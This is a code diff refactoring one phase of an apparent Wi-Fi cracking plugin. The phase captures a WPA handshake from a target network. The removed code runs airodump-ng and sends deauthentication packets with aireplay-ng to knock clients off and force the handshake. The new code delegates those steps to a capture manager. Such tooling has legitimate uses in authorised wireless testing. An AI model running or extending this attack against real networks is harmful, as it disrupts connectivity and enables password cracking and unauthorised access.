@@ -1,66 +1,63 @@
-import subprocess
-import os
-import time
-from core.logger import logger
+# /home/nexus/capgate/src/plugins/wifi_crack_automation/phases/phase3_capture.py
 
-def capture_handshake(context):
-    """Phase 3: Handshake capture (interactive + automated, robust)."""
+from typing import Optional # Keep for type hints
+# Removed subprocess, os, time imports - now handled by CaptureManager
+
+from core.logger import logger
+from core.state_management.context import CapGateContext # Import CapGateContext
+from core.capture_manager import CaptureManager # Import the new CaptureManager
+
+def capture_handshake(app_context: CapGateContext) -> bool:
+    """
+    Phase 3: Initiates WPA handshake capture for the selected target network
+    using the CaptureManager.
+
+    Args:
+        app_context (CapGateContext): The global CapGate context for the current run.
+
+    Returns:
+        bool: True if a handshake is successfully captured and the file path is stored, False otherwise.
+    """
     logger.info("[Phase 3] Capturing WPA handshake...")
 
-    target = context.get("target")
-    iface = context.get("interface")
-    capture_time = context.get("capture_time", 30)
-    deauth_count = context.get("deauth_count", 5)
-    auto_mode = context.get("auto_select", False)
+    # Retrieve necessary parameters from app_context.runtime_meta (set by main plugin or previous phases)
+    target_bssid: Optional[str] = app_context.get("target_bssid")
+    target_channel: Optional[str] = app_context.get("target_channel")
+    target_essid: Optional[str] = app_context.get("target_essid")
+    monitor_interface: Optional[str] = app_context.get("monitor_interface")
+    
+    capture_time: int = app_context.get("capture_time_seconds", 30) # Default to 30 seconds
+    deauth_count: int = app_context.get("deauth_count", 5) # Default deauth packets
+    auto_mode: bool = app_context.get("auto_select_interface", False) # Use consistent auto-select key
 
-    if not target or not iface:
-        logger.error("Target or interface missing.")
+    if not target_bssid or not target_channel or not monitor_interface:
+        logger.error("Target BSSID, channel, or monitor interface missing in context. Cannot capture handshake.")
         return False
 
-    output_file = f"handshake_{target['essid']}.cap"
+    # Create a descriptive output file prefix for the capture
+    output_file_prefix = f"handshake_{target_essid.replace(' ', '_').replace('/', '_')}_{target_bssid.replace(':', '')}"
 
-    try:
-        logger.info(f"Starting airodump-ng on {iface} to capture handshake for {target['essid']} ({target['bssid']})...")
-        dump_proc = subprocess.Popen([
-            "airodump-ng",
-            "--bssid", target["bssid"],
-            "--channel", str(target["channel"]),
-            "--write", output_file[:-4],
-            iface
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # Instantiate the CaptureManager
+    capture_manager = CaptureManager()
 
-        logger.info(f"Sending {deauth_count} deauth packets to {target['bssid']} to force handshake...")
-        subprocess.run([
-            "aireplay-ng", "--deauth", str(deauth_count), "-a", target["bssid"], iface
-        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    # Call the abstracted capture handshake method
+    captured_file_path = capture_manager.capture_handshake(
+        monitor_interface=monitor_interface,
+        target_bssid=target_bssid,
+        target_channel=target_channel,
+        output_file_prefix=output_file_prefix,
+        capture_time_seconds=capture_time,
+        deauth_count=deauth_count,
+        auto_mode=auto_mode
+    )
 
-        if auto_mode:
-            logger.info(f"[Auto Mode] Waiting for handshake capture ({capture_time}s)...")
-            time.sleep(capture_time)
-        else:
-            logger.info(f"Waiting for handshake capture ({capture_time}s)... Press Ctrl+C to stop early.")
-            try:
-                time.sleep(capture_time)
-            except KeyboardInterrupt:
-                logger.info("Capture interrupted by user.")
-
-        dump_proc.terminate()
-        dump_proc.wait(timeout=5)
-
-        cap_file = output_file
-        if os.path.exists(cap_file):
-            logger.info("[✓] Handshake captured: {cap_file}")
-            context["handshake_file"] = cap_file
-            return True
-        else:
-            logger.error("Handshake capture failed. No .cap file found.")
-            return False
-
-    except Exception as e:
-        logger.error(f"Error during handshake capture: {e}")
-        try:
-            dump_proc.terminate()
-            dump_proc.wait(timeout=5)
-        except Exception:
-            pass
+    if captured_file_path:
+        app_context.set("handshake_file", captured_file_path) # Store full path to captured file
+        logger.info(f"[✓] Handshake captured. File: {captured_file_path}")
+        return True
+    else:
+        logger.error("[✘] Handshake capture failed.")
+        app_context.set("handshake_file", None) # Ensure context is clear
         return False
+
+# Removed the __main__ block (consistent with other plugin phases)
